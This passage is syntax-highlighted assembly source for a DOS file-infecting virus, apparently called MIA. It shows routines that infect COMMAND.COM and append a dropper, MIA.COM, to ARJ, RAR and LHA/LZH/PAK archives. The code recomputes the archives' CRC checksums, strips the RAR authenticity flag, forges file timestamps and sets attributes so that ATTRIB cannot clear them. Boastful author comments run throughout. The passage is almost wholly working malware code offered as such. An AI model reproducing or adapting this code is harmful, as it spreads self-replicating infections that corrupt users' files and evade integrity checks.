 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc4">],</span><span class="sc2">3Fh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                  </span><span class="sc1">; BX = file handle, BP = SP</span><span class="sc0">
 </span><span class="sc6">les</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc4">]</span><span class="sc0">      
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old_Time</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Store time stamp</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old_Date</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; Ditto... date stamp</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">0Eh</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Keep_Mode</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old_Time</span><span class="sc4">],</span><span class="sc2">4800h</span><span class="sc0">    </span><span class="sc1">; Set file time to 09:00:00 AM</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old_Date</span><span class="sc4">],</span><span class="sc2">0653h</span><span class="sc0">    </span><span class="sc1">; Set date to February 19th, 1983</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">43h</span><span class="sc0">                 </span><span class="sc1">; If dropping MIA.COM, set R/H attributes and</span><span class="sc0">
                               </span><span class="sc1">; bit-6 attributes so ATTRIB.EXE won't be able</span><span class="sc0">
</span><span class="sc5">Keep_Mode</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; to change the file attributes, 8-)</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">File_Attribs</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">                 </span><span class="sc1">; System file, volume label, or directory?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Liveaid</span><span class="sc0">                </span><span class="sc1">; Bail out if yes</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_BOF</span><span class="sc0">              </span><span class="sc1">; Lseek to BOF</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read function</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                 </span><span class="sc1">; First 24 bytes to read</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0">        </span><span class="sc1">; Read buffer</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; CX - AX - CF = Zero ?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Liveaid</span><span class="sc0">                </span><span class="sc1">; If ZF=0 probably the file is smaller than 24</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">                     </span><span class="sc1">; bytes or the disk has error</span><span class="sc0">
 </span><span class="sc6">lds</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Load pointer to filename</span><span class="sc0">

</span><span class="sc5">SearchZero</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                  </span><span class="sc1">; ASCIZ ?</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">SearchZero</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">                 </span><span class="sc1">; 11 characters to be compared</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WinVxD</span><span class="sc0">
 </span><span class="sc6">std</span><span class="sc0">                           </span><span class="sc1">; Set backward direction</span><span class="sc0">

</span><span class="sc5">Scribble</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">                         </span><span class="sc1">; Obtain a character</span><span class="sc0">
 </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                 </span><span class="sc1">; Convert to lowercase</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
 </span><span class="sc6">loopz</span><span class="sc0">  </span><span class="sc5">Scribble</span><span class="sc0">               </span><span class="sc1">; Loop while equal</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">cld</span><span class="sc0">                           </span><span class="sc1">; Clear direction</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Undergone</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Put two first bytes into AX</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Exe_Check</span><span class="sc0">              </span><span class="sc1">; Check the presence of .EXE signature</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Undergone</span><span class="sc0">              </span><span class="sc1">; COMMAND.COM has .EXE format? infect it if so</span><span class="sc0">
                               </span><span class="sc1">; else, don't infect it</span><span class="sc0">
</span><span class="sc5">Liveaid</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Old_Date</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; File date stamp</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">
 </span><span class="sc6">jb</span><span class="sc0">     </span><span class="sc5">Unset</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0C8h</span><span class="sc0">                </span><span class="sc1">; Subtract a century from DH</span><span class="sc0">

</span><span class="sc5">Unset</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Future_File</span><span class="sc0">

</span><span class="sc5">Giveback</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">                  </span><span class="sc1">; Release memory block</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
 </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Undergone</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_EOF</span><span class="sc0">              </span><span class="sc1">; Lseek to EOF</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Dh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2Fh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Save file size</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Get first word</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0EA60h</span><span class="sc0">              </span><span class="sc1">; ARJ archive??</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Archiver</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6152h</span><span class="sc0">               </span><span class="sc1">; RAR archive?</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Process_RAR</span><span class="sc0">            </span><span class="sc1">; Maybe...</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">686Ch</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0">     </span><span class="sc5">Archiver</span><span class="sc0">               </span><span class="sc1">; LHA/LZH/PAK archive? yup!</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Impeach</span><span class="sc0">

</span><span class="sc5">Process_RAR</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">09h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; SI = 000Ch</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; DI = 000Bh</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">07h</span><span class="sc4">],</span><span class="sc2">2172h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Liveaid</span><span class="sc0">                </span><span class="sc1">; Not 'Rar!', so bail out</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">73h</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Archiver</span><span class="sc0">
 </span><span class="sc6">test</span><span class="sc0">   </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Liveaid</span><span class="sc0">                </span><span class="sc1">; Don't infect multi-volume archive</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">0DFh</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">CRC32</span><span class="sc0">                  </span><span class="sc1">; Remove AV bit flag, recalculate header's CRC</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">       </span><span class="sc1">; DI = zero</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_BOF</span><span class="sc0">              </span><span class="sc1">; Lseek to BOF</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">                 </span><span class="sc1">; CX = 0018h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffy</span><span class="sc0">        </span><span class="sc1">; DX = 0003h</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">RightWrite</span><span class="sc0">             </span><span class="sc1">; Write it into file</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Liveaid</span><span class="sc0">                </span><span class="sc1">; Bomb if there was a problem</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_EOF</span><span class="sc0">              </span><span class="sc1">; Move file R/W pointer to EOF</span><span class="sc0">

</span><span class="sc5">Archiver</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D90h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Bait</span><span class="sc0">         </span><span class="sc1">; Open MIA.COM file for read-only</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Stuff_02</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Save file handle</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">jc</span><span class="sc0">     </span><span class="sc5">Liveaid</span><span class="sc0">                </span><span class="sc1">; Huh? MIA hasn't dropped it...</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_EOF</span><span class="sc0">              </span><span class="sc1">; Lseek to the EOF</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">jge</span><span class="sc0">    </span><span class="sc5">Liveaid</span><span class="sc0">                </span><span class="sc1">; SF = OF</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Virus length + dropper's host size</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0">    </span><span class="sc5">Unreachable</span><span class="sc0">            </span><span class="sc1">; Check file size, is it okay? go on... </span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Lseek_BOF</span><span class="sc0">              </span><span class="sc1">; Lseek to the BOF</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; Allocate memory for read buffer</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Available</span><span class="sc0">              </span><span class="sc1">; Insufficient memory?</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0C000h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">14h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">Available</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; Save memory block segment in BP</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0">     </span><span class="sc1">; Read the entire dropper</span><span class="sc0">
 </span><span class="sc6">cwd</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc4">],</span><span class="sc2">0EA60h</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VirEnd</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">VirVxD</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">sbb</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  </span><span class="sc1">; AX = CX, and CF=0 if successful read</span><span class="sc0">
 </span><span class="sc6">pushf</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                 </span><span class="sc1">; Close the dropper</span><span class="sc0">
 </span><span class="sc6">int</span><span class="sc0">    </span><span class="sc2">03h</span><span class="sc0">
 </span><span class="sc6">popf</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0">     </span><span class="sc5">Voyage</span><span class="sc0">                 </span><span class="sc1">; All bytes have been read?</span><span class="sc0">

</span><span class="sc5">Comedown</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">Giveback</span><span class="sc0">

</span><span class="sc5">Unreachable</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">Liveaid</span><span class="sc0">

</span><span class="sc5">Voyage</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">; DX = SI = zero </span><span class="sc0">


</span><span class="sc1">;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ</span><span class="sc0">
</span><span class="sc1">; Calculate  CRC-16  of our dropper, this will be done by a small subroutine,</span><span class="sc0">
</span><span class="sc1">; unlike other  CRC-16  generators,  this one does not need additional memory</span><span class="sc0">
</span><span class="sc1">; space (usually 1024 bytes) for CRC table like,  for instance,  UNPAK.EXE or</span><span class="sc0">
</span><span class="sc1">; Win32.INCA virus  (I wonder why Vecna used that).  Thanks to  Zhengxi, Ltd.</span><span class="sc0">
</span><span class="sc1">; for its run-time CRC-32 generator which inspired Me to write this  (I can't</span><span class="sc0">
</span><span class="sc1">; believe it,  if CRC-16 generator can be made as simple as this one,  so why</span><span class="sc0">
</span><span class="sc1">; should we bother to create huge CRC table?).</span><span class="sc0">
</span><span class="sc1">; On entry: CX    = number of bytes of data to be calculated</span><span class="sc0">
</span><span class="sc1">;           DS:SI = first byte of data to be calculated</span><span class="sc0">
</span><span class="sc1">; Return:   AX    = destroyed</span><span class="sc0">
</span><span class="sc1">;           CX    = zero</span><span class="sc0">
</span><span class="sc1">;           DX    = CRC-16 value</span><span class="sc0">
</span><span class="sc1">;           DS:SI = first byte after last byte of data</span><span class="sc0">
</span><span class="sc1">;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹</span><span class="sc0">


</span><span class="sc5">CRC16</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; This is only needed in .LHA/.LZH/.PAK infection</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">lodsb</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                 </span><span class="sc1">; Process 8 bits</span><span class="sc0">

</span><span class="sc5">Shifting</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">shr</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
 </span><span class="sc6">jnc</span><span class="sc0">    </span><span class="sc5">Skip_CRC</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A001h</span><span class="sc0">              </span><span class="sc1">; Does anyone know why I should use this value?</span><span class="sc0">

</span><span class="sc5">Skip_CRC</span><span class="sc4">:</span><span class="sc0">                      </span><span class="sc1">; I've sworn that if MIA's CRC-16 generator</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc0">                     </span><span class="sc1">; needs to build a CRC table before doing</span><span class="sc0">
 </span><span class="sc6">jnz</span><span class="sc0">    </span><span class="sc5">Shifting</span><span class="sc0">               </span><span class="sc1">; calculation, I wouldn't bother to include</span><span class="sc0">
 </span><span class="sc6">xor</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; .LHA/.LZH/.PAK infection. 8-)</span><span class="sc0">
 </span><span class="sc6">loop</span><span class="sc0">   </span><span class="sc5">CRC16</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc6">xchg</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                  
 </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">CRC32</span><span class="sc0">                  </span><span class="sc1">; Calculate CRC-32 of dropper, this is used</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc0">                     </span><span class="sc1">; for .ARJ and .RAR infections</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">45h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get .ARJ/.LHA/.LZH/.PAK/.RAR file handle</span><span class="sc0">
